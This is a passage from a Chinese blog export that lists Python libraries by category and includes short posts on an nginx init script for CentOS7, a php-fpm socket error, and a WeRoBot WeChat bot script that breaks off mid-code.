PE文件解析器SIP，自动为C和C++库生成Python扩展模块的工具。</p>\n\n<p>数据库</p>\n\n<p>库名称简介MySQLdb，成熟的[MySQL]数据库模块,Baresql,SQL数据库包ZODB，Python本地对象数据库。一个K-V对象图数据库。</p>\n\n<p>pickledb,简单和轻量级的K-V键值存储。</p>\n\n<p>TinyDB, 轻量级，面向文档的数据库。</p>\n\n<p>mysql-python，MySQL的Python工具库。</p>\n\n<p>mysqlclient，mysql-python分支，支持Python 3.,PyMySQL,纯Python写的 MySQL驱动程序，兼容mysql-python。</p>\n\n<p>mysql-connector-python,MySQL连接器,来自[Oracle]，纯Python编写。</p>\n\n<p>oursql，MySQL连接器，提供本地话指令语句和BLOBs支持。</p>\n\n<p>psycopg2，最流行的Python PostgreSQL适配器。</p>\n\n<p>txpostgres，于Twisted的异步驱动，用于PostgreSQL。</p>\n\n<p>queries,psycopg2函数库，用于PostgreSQL。dataset,存储Python字典数据,用于SQLite，MySQL和PostgreSQL。</p>\n\n<p>cassandra-python-driver，开源分布式NoSQL数据库系统Apache Cassandra系统的Python驱动.pycassa,简化的cassandra数据库Python驱动。</p>\n\n<p>HappyBase，友好的Apache [Hbase]的函数库。</p>\n\n<p>PyMongo，MongoDB官方客户端。</p>\n\n<p>Plyvel，LevelDB快速和功能丰富的Python接口。</p>\n\n<p>redis-py,redis客户端。</p>\n\n<p>py2neo,Python客户端(基于Neo4j的RESTful接口).</p>\n\n<p>telephus,基于Twisted的cassandra客户端。</p>\n\n<p>txRedis，基于Twisted的Redis客户端。</p>\n\n<p>在学习Python的过程中，往往因为没有资料或者没人指导从而导致自己不想学下去了，因此我特意准备了个群 592539176 ，群里有大量的PDF书籍、教程都给大家免费使用！不管是学习到哪个阶段的小伙伴都可以获取到自己相对应的资料！</p>\n\n<p>【网络】</p>\n\n<p>Curl，Pycurl包是一个libcurl的Python接口，它是由C语言编写的。与urllib相比，它的速度要快很多。Libcurl是一个支持FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 和 LDAP的客户端URL传输库.libcurl也支持HTTPS认证,HTTP POST,HTTP PUT,FTP上传,代理,Cookies,基本身份验证,FTP文件断点继传,HTTP代理通道等等。</p>\n\n<p>Requests，用Python语言编写，基于 urllib的开源 HTTP 库。它比 urllib 更加方便，更加 Pythoner。支持 Python3。</p>\n\n<p>httpie，命令行HTTP客户端，用户友好的cURL的替换工具。</p>\n\n<p>s3cmd，命令行工具，用于管理Amazon S3和CloudFront。</p>\n\n<p>youtube-dl，命令行程序，从YouTube下载视频。</p>\n\n<p>you-get，Python3写的视频下载工具，可用于YouTube/Youku优酷/Niconico视频下载Coursera，从coursera.org下载视频，可重新命名文件wikiteam，wiki下载工具。</p>\n\n<p>subliminal，命令行工具，搜索和下载字幕的函数库。</p>\n\n<p>requests，HTTP函数库，更加人性化。</p>\n\n<p>grequests，异步HTTP请求+ Gevent（高性能高并发函数库）。</p>\n\n<p>urllib3，一个线程安全的HTTP连接池，支持文件post。</p>\n\n<p>httplib2，综合HTTP的客户端函数库。</p>\n\n<p>treq， Python API接口，Twisted的HTTP客户。</p>\n\n<p>Mininet，流行的网络仿真器,API采用python编写。</p>\n\n<p>POX，基于Python的开源软件定义网络（SDN）控制开发平台的应用，如OpenFlow的SDN控制器。</p>\n\n<p>Pyretic，SDN的编程语言，提供了强大的抽象在网络交换机或仿真器。</p>\n\n<p>SDX Platform，基于SDN的IXP实现，利用最小网络，痘和热。</p>\n\n<p>inbox.py，Python的SMTP服务器。</p>\n\n<p>imbox， Python版本IMAP库。</p>\n\n<p>inbox，收件箱，开源邮件工具包。</p>\n\n<p>lamson,SMTP服务器。</p>\n\n<p>flanker,侧卫,电子邮件地址和MIME解析库。</p>\n\n<p>marrow.mailer,高性能可扩展邮件交付框架。</p>\n\n<p>django-celery-ses， Django电子邮件后台，使用AWS SES和Celery。</p>\n\n<p>modoboa，邮件托管和管理平台，包括现代和简化Web UI。</p>\n\n<p>envelopes，邮件工具。</p>\n\n<p>mailjet，批量邮寄mailjet API接口，带统计。</p>\n\n<p>Talon，利爪，Mailgun库，提取消息和签名。mailjet- Mailjet API implementation for batch mailing, statistics and more., Talon - Mailgun library to extract message quotations and signatures.,pyzmail，编写，发送和解析电子邮件。</p>\n\n<p>furl，燃料，小型的的URL解析库库。</p>\n\n<p>purl，简单的，干净的API，操纵URL。</p>\n\n<p>pyshorteners，纯Python库，URL短网址编辑。</p>\n\n<p>short_url，短网址生成。</p>\n\n<p>Scrapy，快速屏幕截取和网页抓取的框架。</p>\n\n<p>portia，波西亚，Scrapy的可视化扩展。</p>\n\n<p>feedparser，信息源解释器</p>\n\n<p>RoboBrowser，简单的网页浏览Python函数库，没有使用Web浏览器。</p>\n\n<p>MechanicalSoup，网站自动化互动测试工具包。</p>\n\n<p>mechanize，网页浏览编程工具。</p>\n\n<p>Demiurge，造物主，-PyQuery的轻量级工具。</p>\n\n<p>newspaper,提取报纸新闻。</p>\n\n<p>html2text,转换HTML为 Markdown格式的文本。</p>\n\n<p>python-goose,HTML内容提取器。</p>\n\n<p>lassie,莱西,人性化的网站内容检索。</p>\n\n<p>micawber,通过UR抓提网页的函数库。</p>\n\n<p>sumy，概要，文本和HTML网页的自动文摘模块。</p>\n\n<p>Haul，距离，可扩展的图像爬虫。</p>\n\n<p>python-readability,可读性工具Arc90,快速的Python接口。</p>\n\n<p>opengraph,OpenGraphProtocol协议解析模块,textract，从任何文件，Word，PowerPoint，PDF文件中提取文本，等。</p>\n\n<p>sanitize，消毒，使混乱的数据变的理智。</p>\n\n<p>AutobahnPython， WebSocket和WAMP的函数库，使用 Twisted和PythonWebSocket-for-Python，websocket客户端和服务器端函数库。</p>\n\n<p>SimpleXMLRPCServer，python标准库，简单的XML-RPC服务器，单线程。SimpleJSONRPCServer，JSON-RPC规范实施函数库。</p>\n\n<p>zeroRPC，基于ZeroMQ和MessagePack的RPC实现。</p>\n\n<p>apache-libcloud，所有云服务的Python接口库。</p>\n\n<p>wifi，WiFi -一套个Python库和命令行工具与WiFi，用于[Linux]。</p>\n\n<p>streamparse，运行Python代码和数据的实时流。集成了Apache Storm。</p>\n\n<p>boto，亚马逊网络服务接口。</p>\n\n<p>twython，Twitter推特API。</p>\n\n<p>google-api-python-client，谷歌客户端API。</p>\n\n<p>gspread，谷歌电子表格的Python API。</p>\n\n<p>facebook-sdk，facebook平台Python SDK。</p>\n\n<p>facepy，简易的facebook图形APIgmail，Gmail的Python接口。</p>\n\n<p>django-wordpress，Django的WordPress的模型和视图。</p>\n\n<p>Web框架</p>\n\n<p>Django，最流行的Python-Web框架，鼓励快速开发,并遵循MVC设计，开发周期短ActiveGrid企业级的Web2.0解决方案Karrigell简单的Web框架，自身包含了Web服务，py脚本引擎和纯python的数据库</p>\n\n<p>PyDBLitewebpy 一个小巧灵活的Web框架，虽然简单但是功能强大CherryPy基于Python的Web应用程序开发框架。</p>\n\n<p>Pylons 基于Python的一个极其高效和可靠的Web开发框架</p>\n\n<p>Zope 开源的Web应用服务器</p>\n\n<p>TurboGears 基于Python的MVC风格的Web应用程序框架Twisted流行的网络编程库，大型Web框架。</p>\n\n<p>QuixoteWeb开发框架Flask,轻量级web框架。</p>\n\n<p>Bottle，快速，简单和轻量级的WSGI模式Web框架。</p>\n\n<p>Pyramid，轻量级，快速，稳定的开源Web框架。</p>\n\n<p>web2py，简单易用的全堆栈Web框架和平台。</p>\n\n<p>web.py，强大、简单的Web框架。</p>\n\n<p>TurboGears，便于扩展的Web框架。</p>\n\n<p>CherryPy，极简Python Web框架，支持，HTTP 1.1和WSGI线程池。</p>\n\n<p>Grok，基于Zope3的Web框架。</p>\n\n<p>Bluebream，开源的Web应用服务器，原名Zope 3。</p>\n\n<p>guava，轻量级，高性能的Python-Web框架，采用c语言编写。</p>\n\n<p>django-cms，基于Django企业级开源CMS。</p>\n\n<p>djedi-cms轻量级但功能强大的Django CMS的插件，内联编辑和性能优化。</p>\n\n<p>FeinCMS，基于Django的先进内容管理系统。</p>\n\n<p>Kotte，高层次的Python的Web应用框架，基于Pyramid。</p>\n\n<p>Mezzanine，强大，一致，灵活的内容管理平台。</p>\n\n<p>Opps，基于Django的CMS，用于高流量的报纸、杂志和门户网站。</p>\n\n<p>Plone，基于Zope的开源应用服务器Zope。</p>\n\n<p>Quokka，灵活，可扩展的，轻量级的CMS系统，使用Flask和MongoDB。</p>\n\n<p>Wagtail，Django内容管理系统。</p>\n\n<p>Widgy，CMS框架，基于Django。</p>\n\n<p>django-oscar，Django奥斯卡，开源的电子商务框架。</p>\n\n<p>django-shop，基于Django的网店系统。</p>\n\n<p>merchant，支持多种付款处理工具。</p>\n\n<p>money，可扩展的货币兑换解决方案。</p>\n\n<p>python-currencies，货币显示格式。</p>\n\n<p>cornice，Pyramid的REST框架。</p>\n\n<p>django-rest-framework，Django框架，强大灵活的工具，可以很容易地构建Web API。</p>\n\n<p>django-tastypie，创造精美的Django应用程序API接口。</p>\n\n<p>django-formapi，创建JSON API、HMAC认证和Django表单验证。</p>\n\n<p>flask-api，提供统一的浏览器体验，基于Django框架。</p>\n\n<p>flask-restful，快速构建REST API支持扩展。</p>\n\n<p>flask-api-utils，flask的扩展。</p>\n\n<p>falcon，猎鹰，高性能的Python框架，构建云API和Web应用程序后端。</p>\n\n<p>eve，夏娃，REST API框架，使用Flask，MongoDB和良好意愿。</p>\n\n<p>sandman，睡魔，为现有的数据库驱动的系统，自动生成REST API。</p>\n\n<p>restless，类似TastyPie的框架。</p>\n\n<p>savory-pie，REST API构建函数库（Django，及其他）Jinja2，现代设计师友好的语言模板。</p>\n\n<p>Genshi，网络感知输出模板工具包。</p>\n\n<p>Mako，马可，Python平台的超高速、轻型模板。</p>\n\n<p>Chameleon，变色龙，一个HTML / XML模板引擎。仿照ZPT，优化速度。</p>\n\n<p>Spitfire，快速的Python编译模板。</p>\n\n<p>django-haystack,大海捞针,Django模块搜索。</p>\n\n<p>elasticsearch-py,Elasticsearch官方低级的Python客户端。</p>\n\n<p>solrpy,solr客户端。</p>\n\n<p>Whoosh,呼,快速，纯Python搜索引擎库。</p>\n\n<p>Feedly，建立新闻和通知系统的函数库，使用Cassandra和Redis。</p>\n\n<p>django-activity-stream,Django活动流,从你网站上的行动,产生通用的活动流。</p>\n\n<p>Beaker，烧杯，一个缓存和会话使用的Web应用程序，独立的Python脚本和应用程序库。</p>\n\n<p>dogpile.cache，是Beaker作者的下一代替代作品。</p>\n\n<p>HermesCache，Python的缓存库，基于标签的失效及预防Dogpile效果。</p>\n\n<p>django-cache-machine，Django缓存机，自动缓存失效，使用ORM。</p>\n\n<p>django-cacheops，自动颗粒事件驱动，ORM缓存失效。</p>\n\n<p>johnny-cache,约翰尼高速缓存框架,Django应用程序。</p>\n\n<p>django-viewlet,渲染模板部件扩展缓存控制。</p>\n\n<p>pylibmc,在libmemcached接口。</p>\n\n<p>WTForms-JSON,JSON表单数据处理扩展。</p>\n\n<p>Deform， HTML表单生成的函数库。</p>\n\n<p>django-bootstrap3，bootstrap3，集成了Django。</p>\n\n<p>django-crispy-forms，Django程序，可以创建优雅的表单。</p>\n\n<p>django-remote-forms，Django的远程表单，Django表格的序列化程序。</p>\n\n<p>django-simple-spam-blocker，Django简单的垃圾邮件拦截器。</p>\n\n<p>django-simple-captcha，Django简单验证码，简单的和高度可定制的Django应用程序，用于添加验证码图像Ajenti，服务器管理面板。</p>\n\n<p>Grappelli，界面花哨的django皮肤。</p>\n\n<p>django-suit，Django替代o界面（仅用于非商业用途）。</p>\n\n<p>django-xadmin，Django管理面板替代工具。</p>\n\n<p>flask-admin，简单的flask管理界面框架flower，实时监控和Web管理面板。</p>\n\n<p>Pelican，鹈鹕，Markdown或ReST，字王内容主题。支持 DVCS, Disqus. AGPL。</p>\n\n<p>Cactus,仙人掌,设计师的网站静态生成器。</p>\n\n<p>Hyde，海德， 基于Jinja2的静态网站生成器。</p>\n\n<p>Nikola，尼古拉-一个静态网站和博客生成器。</p>\n\n<p>Tags，标签，最简单的静态网站生成器。</p>\n\n<p>Tinkerer，工匠，基于Sphinx的静态网站生成器。</p>\n\n<p>asyncio，（在Python 3.4 +是Python标准库），异步I/O，事件循环，协同任务。</p>\n\n<p>gevent，基于Python的网络库。</p>\n\n<p>Twisted，扭曲，事件驱动的网络引擎。</p>\n\n<p>Tornado，龙卷风，Web框架和异步网络的函数库。</p>\n\n<p>pulsar，脉冲星，事件驱动的并行框架的Python。</p>\n\n<p>diesel，柴油，绿色的，基于事件的I/O框架。</p>\n\n<p>eventlet，WSGI支持异步框架。</p>\n\n<p>pyzmq， 0MQ消息库的Python封装。</p>\n\n<p>txZMQ,基于Twisted的0MQ消息库封Crossbar,开源统一应用路由器（WebSocket和WAMP）。</p>\n\n<p>wsgiref，Python标准库，WSGI封装实现，单线程。</p>\n\n<p>Werkzeug，机床，WSGI工具函数库，很容易地嵌入到你自己的项目框架。</p>\n\n<p>paste，粘贴，多线程，稳定的，久经考验的WSGI工具。</p>\n\n<p>rocket，火箭，多线程服务，基于Pyramid。</p>\n\n<p>netius，快速的、异步WSGI服务器，gunicorn，forked前身，部分用C写的。</p>\n\n<p>fapws3，异步网络，用C写的。</p>\n\n<p>meinheld，异步WSGI服务器，是用C写的。</p>\n\n<p>bjoern，-快速的、异步WSGI服务器，用C写的。</p>\n\n<p>安全</p>\n\n<p>Permissions函数库，允许或拒绝用户访问数据或函数。</p>\n\n<p>django-guardian,Django守护者，管理每个对象的权限，用于Django 1.2 +Carteblanche，管理导航和权限。</p>\n\n<p>Authomatic，简单强大的认证/授权客户端。</p>\n\n<p>OAuthLib， 通用，规范，OAuth请求签约工具。</p>\n\n<p>rauth，用于OAuth 1.0，2.0，的Python库。</p>\n\n<p>python-oauth2，利用全面测试，抽象接口来创建OAuth的客户端和服务器。</p>\n\n<p>python-social-auth，易于安装的社会认证机制。</p>\n\n<p>django-oauth-toolkit,Django OAuth工具包django-oauth2-provider,Django OAuth2工具包。</p>\n\n<p>django-allauth，Django认证的应用程序。</p>\n\n<p>Flask-OAuthlib，Flask的OAuth工具包sanction，制裁，简单的oauth2客户端。</p>\n\n<p>jose，[JavaScript]对象签名和加密(JOSE)草案实施，标记状态。</p>\n\n<p>python-jwt，JSON的Web令牌生成和验证模块。</p>\n\n<p>pyjwt，JSON的Web令牌草案01。</p>\n\n<p>python-jws，JSON的Web令牌草案02。</p>\n\n<p>PyCrypto，Python的加密工具包。</p>\n\n<p>Paramiko，sshv2协议的实现，提供了客户端和服务器端的功能。</p>\n\n<p>cryptography，密码开发工具包。</p>\n\n<p>PyNac，网络和密码（NaCl）函数库。</p>\n\n<p>hashids，hashids的 Python函数库。</p>\n\n<p>Passlib，安全的密码存储/哈希库，非常高的水平。</p>\n\n<p>hashlib,md5, sha等hash算法，用来替换md5和sha模块，并使他们的API一致。</p>\n\n<p>它由OpenSSL支持，支持如下算法：md5,sha1, sha224, sha256, sha384, sha512.</p>\n\n<p>GUI库</p>\n\n<p>名称简介PyGtk，基于Python的GUI程序开发GTK+库PyQt用于Python的QT开发库WxPythonPython下的GUI编程框架，其消息机制与MFC的架构相似,入门非常简单，需要快速开发相关的应用可以使用这个TkinterPython下标准的界面编程包，因此不算是第三方库了PySide，跨平台Qt的应用程序和用户界面框架，支撑Qt v4框架。</p>\n\n<p>wxPython，混合wxWidgets的C++类库。</p>\n\n<p>kivy，创建应用程序GUI函数库，看运行于Windows，Linux，MAC OS X，[Android]和[iOS]。</p>\n\n<p>curse，用于创建终端GUI应用程序。</p>\n\n<p>urwid，创建终端GUI应用程序窗体的函数库，支持事件，色彩丰富。</p>\n\n<p>pyglet，跨平台的窗口和多媒体库的Python。</p>\n\n<p>Tkinter，是Python事实上的标准GUI软件包。</p>\n\n<p>enaml，创建漂亮的用户界面，语法类似QML。</p>\n\n<p>Toga，托加，OS原生GUI工具包。【构建封装】</p>\n\n<p>pyenv,简单的Python版本管理。</p>\n\n<p>virtualenv,创建独立的Python环境，用于同时安装不同版本的python环境。</p>\n\n<p>virtualenvwrapper，是virtualenv的一组扩展。</p>\n\n<p>pew,一套管理多个虚拟环境的工具。</p>\n\n<p>vex，使运行指定的virtualenv命令。</p>\n\n<p>PyRun，一个单文件，无需安装的Python版本管理工具。</p>\n\n<p>PIP，Python包和依赖的管理工具。</p>\n\n<p>easy_install，软件包管理系统,提供一个标准的分配Python软件和 函式库的格式。是一个附带设置工具的模块，和一个第三方函式库。旨在加快Python函式库的分配程式的速度。类似Ruby语言的RubyGems 。</p>\n\n<p>conda，跨平台，二进制软件包管理器。</p>\n\n<p>Curdling，一个管理Python包的命令行工具。</p>\n\n<p>wheel，Python发行的新标准，旨在替代eggs.cx-Freeze，跨平台的，用于打包成可执行文件的库</p>\n\n<p>py2exe, Windows平台的Freeze脚本工具，Py2exe ，将python脚本转换为windows上可以独立运行的可执行程序py2app，MAC OS X平台的Freeze脚本工具。</p>\n\n<p>pyinstaller，-转换成独立的可执行文件的Python程序（跨平台）。</p>\n\n<p>pynsist,构建Windows安装程序的工具，用Python编写。</p>\n\n<p>dh-virtualenv,建立和分发virtualenv(Debian软件包格式)</p>\n\n<p>PyPI，新一代的Python包库管理工具。warehouse,新一代的Python包库（PyPI）管理工具。</p>\n\n<p>devpi，PyPI服务器和包装/测试/发布工具。</p>\n\n<p>localshop，PyPI官方包镜像服务器，支持本地（私人）包上传。</p>\n\n<p>buildout，创建，组装和部署应用程序的多个部分，其中一些可能是非基于Python的。</p>\n\n<p>SCons，软件构造工具。</p>\n\n<p>platformio，一个控制台的工具，构建的代码可用于不同的开发平台。</p>\n\n<p>bitbake，特殊设计的工具，用于创建和部署[嵌入式]Linux软件包</p>\n\n<p>fabricate，自动为任何编程语言，生成依赖包。</p>\n\n<p>django-compressor，Django压缩机，压缩和内联JavaScript或CSS，链接到一个单一的缓存文件。</p>\n\n<p>jinja-assets-compressor，金贾压缩机，一个Jinja扩展，通过编译，压缩你的资源。</p>\n\n<p>webassets，优化管理，静态资源，独特的缓存清除。</p>\n\n<p>fanstatic，球迷，包优化，提供静态文件。</p>\n\n<p>fileconveyor，监控资源变化，，可保存到CDN（内容分发网络）和文件系统。</p>\n\n<p>django-storages，一组自定义存储Django后台。</p>\n\n<p>glue，胶胶，一个简单的命令行工具，生成CSS Sprites。</p>\n\n<p>libsass-python，Sass (层叠样式表)的Python接口。</p>\n\n<p>Flask-Assets，整合应用程序资源。【代码调试】</p>\n\n<p>unittest，Python标准库，单元测试框架。</p>\n\n<p>nose，鼻子，unittest延伸产品。</p>\n\n<p>pytest，成熟的全功能的Python测试工具。</p>\n\n<p>mamba，曼巴，Python的权威测试工具，出自BDD的旗下。</p>\n\n<p>contexts，背景，BDD测试框架，基于C#。</p>\n\n<p>pyshould，should风格的测试框架，基于PyHamcrest.pyvows，BDD风格测试框架Selenium，web测试框架，Python绑定Selenium。</p>\n\n<p>splinter，分裂，测试Web应用程序的开源工具。</p>\n\n<p>locust，刺槐，可扩展的用户负载测试工具，用Python写的。</p>\n\n<p>sixpack，语言无关的A/B测试框架。</p>\n\n<p>mock，模拟对象（英语：mock object，也译作模仿对象），模拟测试库。</p>\n\n<p>responses，工具函数，用于mock模拟测试。</p>\n\n<p>doublex-强大的测试框架。</p>\n\n<p>freezegun，通过时间调整，测试模块。</p>\n\n<p>httpretty， HTTP请求的模拟工具。</p>\n\n<p>httmock，mock模拟测试。</p>\n\n<p>coverage，代码覆盖度量测试。</p>\n\n<p>faker，生成模拟测试数据的Python包。</p>\n\n<p>mixer，混频器，产生模拟数据，用于Django ORM，SQLAlchemy，Peewee, MongoEngine, Pony ORM等model_mommy，在Django创建测试随机工具。</p>\n\n<p>ForgeryPy，易用的模拟数据发生器。</p>\n\n<p>radar，雷达，生成随机日期/时间。</p>\n\n<p>FuckIt.py，测试Python代码运行。</p>\n\n<p>Code Analysispysonar2，Python类型索引。</p>\n\n<p>pycallgraph,可视化的流量（调用图）应用程序。</p>\n\n<p>code2flow,转换Python和JavaScript代码到流程图。</p>\n\n<p>LinterFlake8，源代码模块检查器pylama，Python和JavaScript代码审计工具。</p>\n\n<p>Pylint，源代码分析器，它查找编程错误，帮助执行一个代码标准和嗅探一些代码味道。注意：相比于PyChecker，Pylint是一个高阶的Python代码分析工具，它分析Python代码中的错误。</p>\n\n<p>Pyflakes，一个用于检查Python源文件错误的简单程序。Pyflakes分析程序并且检查各种错误。它通过解析源文件实现，无需导入。</p>\n\n<p>pdb,Python标准库,Python调试器。</p>\n\n<p>ipdb,IPython使用的PDB。</p>\n\n<p>winpdb，独立于平台的GUI调试器。</p>\n\n<p>pudb，全屏，基于python调试控制台。</p>\n\n<p>pyringe，-可附着于及注入代码到Python程序的调试器。</p>\n\n<p>python-statsd，statsd服务器客户端。</p>\n\n<p>memory_profiler， 内存监视。</p>\n\n<p>profiling，交互式Python分析器。</p>\n\n<p>django-debug-toolbar, Django调试工具栏,显示各种调试信息:当前请求/响应。django-devserver,Django调试工具。</p>\n\n<p>flask-debugtoolbar,flask调试工具。</p>\n                                    </div>", "log_PostTime": 1584891284, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "CentOS7下启动Nginx出现Failed to start nginx.service:unit not found", "log_Intro": "CentOS7下启动Nginx出现Failed to start nginx.service:unit not found", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3>错误的原因就是没有添加nginx服务，所以启动失败。</h3>\n\n<p><strong>解决方法：</strong></p>\n\n<p><strong>1.</strong>    <strong>在/root/etc/init.d/目录下新建文件，文件名为nginx</strong></p>\n\n<p><strong>　　或者用命令在根目录下执行:# vim /etc/init.d/nginx    (注意vim旁边有一个空格)</strong></p>\n\n<p> </p>\n\n<p><strong>2.    插入以下代码 </strong></p>\n\n<pre>\n<code>#!/bin/sh\n# nginx - this script starts and stops the nginx daemin\n#\n# chkconfig:   - 85 15\n\n# description:  Nginx is an HTTP(S) server, HTTP(S) reverse \\\n#               proxy and IMAP/POP3 proxy server\n\n# processname: nginx\n# config:      /usr/local/nginx/conf/nginx.conf\n# pidfile:     /usr/local/nginx/logs/nginx.pid\n\n# Source function library.\n\n. /etc/rc.d/init.d/functions\n\n# Source networking configuration.\n\n. /etc/sysconfig/network\n\n# Check that networking is up.\n\n[ \"$NETWORKING\" = \"no\" ] &amp;&amp; exit 0\n\nnginx=\"/usr/local/nginx/sbin/nginx\"\n\nprog=$(basename $nginx)\n\nNGINX_CONF_FILE=\"/usr/local/nginx/conf/nginx.conf\"\n\nlockfile=/var/lock/subsys/nginx\n\nstart() {\n\n    [ -x $nginx ] || exit 5\n\n    [ -f $NGINX_CONF_FILE ] || exit 6\n\n    echo -n $\"Starting $prog: \"\n\n    daemon $nginx -c $NGINX_CONF_FILE\n\n    retval=$?\n\n    echo\n\n    [ $retval -eq 0 ] &amp;&amp; touch $lockfile\n\n    return $retval\n\n}\n\n\nstop() {\n\n    echo -n $\"Stopping $prog: \"\n\n    killproc $prog -QUIT\n\n    retval=$?\n\n    echo\n\n    [ $retval -eq 0 ] &amp;&amp; rm -f $lockfile\n\n    return $retval\n\n}\n\n\n\nrestart() {\n\n    configtest || return $?\n\n    stop\n\n    start\n\n}\n\n\nreload() {\n\n    configtest || return $?\n\n    echo -n $\"Reloading $prog: \"\n\n    killproc $nginx -HUP\n\n    RETVAL=$?\n\n    echo\n\n}\n\nforce_reload() {\n\n    restart\n\n}\n\n\nconfigtest() {\n\n  $nginx -t -c $NGINX_CONF_FILE\n\n}\n\n\n\nrh_status() {\n\n    status $prog\n\n}\n\n\nrh_status_q() {\n\n    rh_status &gt;/dev/null 2&gt;&amp;1\n\n}\n\ncase \"$1\" in\n\n    start)\n\n        rh_status_q &amp;&amp; exit 0\n        $1\n        ;;\n\n    stop)\n\n\n        rh_status_q || exit 0\n        $1\n        ;;\n\n    restart|configtest)\n        $1\n        ;;\n\n    reload)\n        rh_status_q || exit 7\n        $1\n        ;;\n\n\n    force-reload)\n        force_reload\n        ;;\n    status)\n        rh_status\n        ;;\n\n\n    condrestart|try-restart)\n\n        rh_status_q || exit 0\n            ;;\n\n    *)\n\n        echo $\"Usage: $0 {start|stop|status|restart|condrestart|try-restart|reload|force-reload|configtest}\"\n        exit 2\n\nesac</code></pre>\n\n<p> </p>\n\n<p><strong>3. 用命令进入此目录</strong></p>\n\n<p>　　# <strong>cd /etc/init.d</strong></p>\n\n<p> </p>\n\n<p><strong>4. 依此执行以下命令</strong></p>\n\n<p><strong># chmod 755 /etc/init.d/nginx</strong></p>\n\n<p><strong># chkconfig --add nginx   (注意add前面是两个短横线-)</strong></p>\n\n<p> </p>\n\n<p><strong>5. 开启nginx</strong></p>\n\n<p><strong><strong># service nginx start</strong></strong></p>\n\n<p><strong><strong><img alt=\"\" height=\"63\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvOTQ1NDcyLzIwMTcxMi85NDU0NzItMjAxNzEyMjIyMDAyMDk1MjEtMTg4NzEzODE4Ni5wbmc?x-oss-process=image/format,png\" width=\"487\"></strong></strong></p>\n                                    </div>", "log_PostTime": 1584891285, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "php-fpm开启报错-ERROR: An another FPM instance seems to already listen on /tmp/php-cgi.sock", "log_Intro": "php-fpm开启报错-ERROR: An another FPM instance seems to already listen on /tmp/php-cgi.sock", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>在升级了php7.2.0版本之后，重新启动php-fpm过程中遇到一个报错。</p>\n\n<pre>\n An another FPM instance seems to already listen on /tmp/php-cgi.sock</pre>\n\n<pre>\n<code># netstat -ant | grep 9000  //查看启动进程，发现没启动成功</code></pre>\n\n<p>我们去查看一下php-fpm.conf里面的配置：</p>\n\n<pre>\n<code>vim  /usr/local/php/etc/php-fpm.conf  </code></pre>\n\n<p> </p>\n\n<pre>\n<code>[www]\nlisten = /tmp/php-cgi.sock   //注意\nlisten.backlog = -1\nlisten.allowed_clients = 127.0.0.1\nlisten.owner = www\nlisten.group = www</code></pre>\n\n<p> </p>\n\n<p>此时我们需要根据配置文件的listen地址做对应的修改：</p>\n\n<pre>\n<code> vim /usr/local/nginx/conf/nginx.conf</code></pre>\n\n<p> </p>\n\n<pre>\n<code>location ~ [^/]\\.php(/|$) {\n       fastcgi_pass unix:/tmp/php-cgi.sock;    //把127.0.0.1:9000改为此行\n       fastcgi_index index.php;\n       fastcgi_param SCRIPT_FILENAME     $document_root$fastcgi_script_name;\n       include fastcgi_params;\n}\nlocation / {\n      root   html;\n      index index.php index.html index.htm;\n}</code></pre>\n\n<p> </p>\n\n<p>修改完平滑重启nginx，然后启动php-fpm，OK</p>\n                                    </div>", "log_PostTime": 1584891286, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python的WeRoBot框架开发公众号", "log_Intro": "Python的WeRoBot框架开发公众号", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>最终的效果图：</p>\n\n<p><img alt=\"\" src=\"https://img-blog.csdnimg.cn/20200303003159733.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<p>完整代码：</p>\n\n<p> </p>\n\n<pre>\n<code>#coding:utf-8\n# Filename:return_message5.py\n# 被关注回复'Hello World!'\n# 收到 笑话 回复糗百笑话，收到收到 电影 回复电影天堂最新电影，\n# 收到 blog 回复我的简书博客，收到 音乐 回复一首音乐\n# 收到 fight 回复一句话\n\nfrom werobot import WeRoBot\nimport random\nfrom werobot.replies import ArticlesReply, Article\n\nrobot = WeRoBot(token='your_token')\n# 明文模式不需要下面三项\n#robot.config[\"APP_ID\"]=''\n#robot.config[\"APP_SECRET\"]=''\n#robot.config['ENCODING_AES_KEY'] = ''\n\n# 被关注\n@robot.subscribe\ndef subscribe(message):\n    return '''Hello World!\nAnd nice to meet you.\n:）\n'''\n\n# 读取文档里的笑话，把前三行存在 data2 里，字符串太长公众号会报错\ndef joke_data():\n    filename = 'qiushibaike.txt'\n    f = open(filename, 'r')\n    data = f.read()\n    f.close()\n    data1 = data.split()\n    data2 = ''\n    for data_i in data1[0:3]:\n        data2 += data_i + '\\n' + '\\n'\n    return data2\n\n# 读取文档里的电影名称\ndef movie_name():\n    filename = 'movies_name.txt'\n    f = open(filename, 'r')\n    data = f.read()\n    f.close()\n    return data\n\n# 从三首音乐里随机选一首\ndef music_data():\n    music_list = [\n            ['童话镇','陈一发儿','https://e.coka.la/wlae62.mp3','https://e.coka.la/wlae62.mp3'],\n            ['都选C','缝纫机乐队','https://files.catbox.moe/duefwe.mp3','https://files.catbox.moe/duefwe.mp3'],\n            ['精彩才刚刚开始','易烊千玺','https://e.coka.la/PdqQMY.mp3','https://e.coka.la/PdqQMY.mp3']\n            ]\n    num = random.randint(0,2)\n    return music_list[num]\n\n# 读取 fight.txt 里的句子，随机返回一句\ndef get_fighttxt():\n    filename = 'fight.txt'\n    f = open(filename, 'r')\n    data = f.read()\n    f.close()\n    data1 = data.split()\n    max_num = len(data1) - 1\n    num = random.randint(0, max_num)\n    data2 = data1[num]\n    return data2\n\n# 匹配 笑话 回复糗百笑话\n@robot.filter('笑话')\ndef joke(message):\n    data = joke_data()\n    return data\n#如果用\n#@robot.text\n#def joke(message):\n#    if message.content == \"笑话\":\n#会报错\n#UnicodeWarning: Unicode equal comparison failed to convert both arguments to Unicode - interpreting them as being unequal\n\n# 匹配 电影 回复电影名称\n@robot.filter('电影')\ndef movie(message):\n    name 